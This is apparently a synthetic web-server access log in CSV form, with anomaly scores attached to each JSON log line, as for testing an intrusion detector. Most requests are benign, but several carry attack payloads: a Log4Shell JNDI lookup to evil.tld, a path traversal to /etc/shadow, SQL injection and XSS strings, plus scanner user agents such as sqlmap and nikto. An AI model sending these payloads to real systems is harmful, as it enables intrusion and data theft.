score_content,score_session,score_fused,score_fused_norm,line
76.55815887451172,,76.55815887451172,76.55815887451172,{"remote_addr": "128.215.150.137", "time_local": "11/Jan/2025:09:05:46 -0700", "request": "OPTIONS /about HTTP/2", "status": 304, "body_bytes_sent": 13292, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
23.607568740844727,,23.607568740844727,23.607568740844727,{"remote_addr": "247.127.208.231", "time_local": "11/Jan/2025:09:05:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 17324, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
95.13097381591797,,95.13097381591797,95.13097381591797,{"remote_addr": "66.72.129.131", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 4386, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
73.46794891357422,,73.46794891357422,73.46794891357422,{"remote_addr": "152.85.6.185", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /contact HTTP/2", "status": 204, "body_bytes_sent": 8593, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
105.0055923461914,,105.0055923461914,105.0055923461914,{"remote_addr": "141.195.23.159", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 15696, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
126.76880645751953,,126.76880645751953,126.76880645751953,{"remote_addr": "243.155.238.18", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.381244659423828,,13.381244659423828,13.381244659423828,{"remote_addr": "226.99.142.218", "time_local": "11/Jan/2025:09:05:50 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15827, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
95.1602554321289,,95.1602554321289,95.1602554321289,{"remote_addr": "177.86.226.20", "time_local": "11/Jan/2025:09:05:51 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 15936, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
126.60688781738281,,126.60688781738281,126.60688781738281,{"remote_addr": "55.35.12.184", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 17541, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.957587718963623,,1.957587718963623,1.957587718963623,{"remote_addr": "2.28.78.233", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2272, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.8823949098587036,,1.8823949098587036,1.8823949098587036,{"remote_addr": "191.85.132.134", "time_local": "11/Jan/2025:09:05:53 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16629, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.459856986999512,,13.459856986999512,13.459856986999512,{"remote_addr": "46.11.154.19", "time_local": "11/Jan/2025:09:05:54 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 10262, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30156.48828125,,30156.48828125,30156.48828125,{"remote_addr": "84.212.229.210", "time_local": "11/Jan/2025:09:05:55 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1193, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
26.484947204589844,,26.484947204589844,26.484947204589844,{"remote_addr": "158.127.22.228", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 10459, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
5.09869909286499,,5.09869909286499,5.09869909286499,{"remote_addr": "12.22.90.121", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 8721, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
69.44561767578125,,69.44561767578125,69.44561767578125,{"remote_addr": "209.187.96.182", "time_local": "11/Jan/2025:09:05:57 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 11347, "http_referer": "-", "http_user_agent": "dirb/2.22"}
126.5641860961914,,126.5641860961914,126.5641860961914,{"remote_addr": "51.72.186.152", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 6602, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
13.383130073547363,,13.383130073547363,13.383130073547363,{"remote_addr": "70.22.70.105", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16389, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
26.70075035095215,,26.70075035095215,26.70075035095215,{"remote_addr": "94.187.221.201", "time_local": "11/Jan/2025:09:05:59 -0700", "request": "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 6570, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
126.63606262207031,,126.63606262207031,126.63606262207031,{"remote_addr": "192.85.76.122", "time_local": "11/Jan/2025:09:06:00 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14069, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
26.57750701904297,,26.57750701904297,26.57750701904297,{"remote_addr": "176.163.28.7", "time_local": "11/Jan/2025:09:06:01 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 12129, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
26.536548614501953,,26.536548614501953,26.536548614501953,{"remote_addr": "10.29.167.70", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 14906, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
48.006935119628906,,48.006935119628906,48.006935119628906,{"remote_addr": "32.54.38.89", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 4528, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
74.92041778564453,,74.92041778564453,74.92041778564453,{"remote_addr": "199.189.53.254", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 304, "body_bytes_sent": 16852, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
126.7621078491211,,126.7621078491211,126.7621078491211,{"remote_addr": "122.34.104.49", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 14796, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
95.02653503417969,,95.02653503417969,95.02653503417969,{"remote_addr": "173.246.68.238", "time_local": "11/Jan/2025:09:06:05 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6680, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
69.47491455078125,,69.47491455078125,69.47491455078125,{"remote_addr": "129.198.214.159", "time_local": "11/Jan/2025:09:06:06 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 480, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
0.19857458770275116,,0.19857458770275116,0.19857458770275116,{"remote_addr": "190.153.135.111", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3657, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
26.555360794067383,,26.555360794067383,26.555360794067383,{"remote_addr": "189.167.36.232", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
23.6654109954834,,23.6654109954834,23.6654109954834,{"remote_addr": "121.149.105.224", "time_local": "11/Jan/2025:09:06:08 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 13833, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
4.824607849121094,,4.824607849121094,4.824607849121094,{"remote_addr": "232.112.94.120", "time_local": "11/Jan/2025:09:06:09 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 10114, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.475711822509766,,13.475711822509766,13.475711822509766,{"remote_addr": "114.121.167.213", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 5867, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
47.75461196899414,,47.75461196899414,47.75461196899414,{"remote_addr": "201.140.229.237", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 10175, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
52.44084548950195,,52.44084548950195,52.44084548950195,{"remote_addr": "16.94.136.240", "time_local": "11/Jan/2025:09:06:11 -0700", "request": "DELETE /api/user?id=1;DROP TABLE users HTTP/2", "status": 304, "body_bytes_sent": 15904, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
49.42839431762695,,49.42839431762695,49.42839431762695,{"remote_addr": "6.134.63.179", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 201, "body_bytes_sent": 16212, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
73.76948547363281,,73.76948547363281,73.76948547363281,{"remote_addr": "102.212.95.135", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "OPTIONS / HTTP/2", "status": 204, "body_bytes_sent": 14226, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
11.807751655578613,,11.807751655578613,11.807751655578613,{"remote_addr": "149.56.34.29", "time_local": "11/Jan/2025:09:06:13 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 14788, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
5.111726760864258,,5.111726760864258,5.111726760864258,{"remote_addr": "33.7.41.146", "time_local": "11/Jan/2025:09:06:14 -0700", "request": "POST / HTTP/2", "status": 204, "body_bytes_sent": 13262, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
47.660438537597656,,47.660438537597656,47.660438537597656,{"remote_addr": "215.119.193.244", "time_local": "11/Jan/2025:09:06:15 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10245, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
23.538719177246094,,23.538719177246094,23.538719177246094,{"remote_addr": "230.55.175.93", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 17454, "http_referer": "-", "http_user_agent": "dirb/2.22"}
29.422697067260742,,29.422697067260742,29.422697067260742,{"remote_addr": "119.233.142.98", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "POST /search?q=monitor HTTP/2", "status": 302, "body_bytes_sent": 13297, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30183.41796875,,30183.41796875,30183.41796875,{"remote_addr": "147.69.206.138", "time_local": "11/Jan/2025:09:06:17 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 400, "body_bytes_sent": 1011, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
104.97457885742188,,104.97457885742188,104.97457885742188,{"remote_addr": "81.97.191.1", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 17353, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
11.814194679260254,,11.814194679260254,11.814194679260254,{"remote_addr": "193.233.1.65", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 685, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
26.445772171020508,,26.445772171020508,26.445772171020508,{"remote_addr": "96.192.162.159", "time_local": "11/Jan/2025:09:06:19 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "-", "http_user_agent": "dirb/2.22"}
50.65806579589844,,50.65806579589844,50.65806579589844,{"remote_addr": "140.62.185.48", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /contact HTTP/2", "status": 301, "body_bytes_sent": 4417, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.79559326171875,,47.79559326171875,47.79559326171875,{"remote_addr": "179.171.183.90", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /about HTTP/2", "status": 201, "body_bytes_sent": 4204, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.636009216308594,,47.636009216308594,47.636009216308594,{"remote_addr": "254.184.179.129", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1038, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
69.36073303222656,,69.36073303222656,69.36073303222656,{"remote_addr": "194.94.203.116", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 204, "body_bytes_sent": 11968, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
26.5091552734375,,26.5091552734375,26.5091552734375,{"remote_addr": "102.224.30.153", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 13911, "http_referer": "-", "http_user_agent": "dirb/2.22"}
7.698441982269287,,7.698441982269287,7.698441982269287,{"remote_addr": "109.112.194.173", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /dashboard HTTP/2", "status": 301, "body_bytes_sent": 15121, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
13.468769073486328,,13.468769073486328,13.468769073486328,{"remote_addr": "246.53.67.54", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 540, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
73.51303100585938,,73.51303100585938,73.51303100585938,{"remote_addr": "232.6.5.156", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 2068, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
126.6123275756836,,126.6123275756836,126.6123275756836,{"remote_addr": "250.96.208.122", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10328, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
52.42802810668945,,52.42802810668945,52.42802810668945,{"remote_addr": "39.180.174.230", "time_local": "11/Jan/2025:09:06:25 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 16013, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.494250297546387,,13.494250297546387,13.494250297546387,{"remote_addr": "26.215.116.80", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "PUT /admin HTTP/2", "status": 200, "body_bytes_sent": 9753, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
129.594482421875,,129.594482421875,129.594482421875,{"remote_addr": "34.152.164.74", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 304, "body_bytes_sent": 437, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.919339656829834,,1.919339656829834,1.919339656829834,{"remote_addr": "220.205.250.187", "time_local": "11/Jan/2025:09:06:27 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1536, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
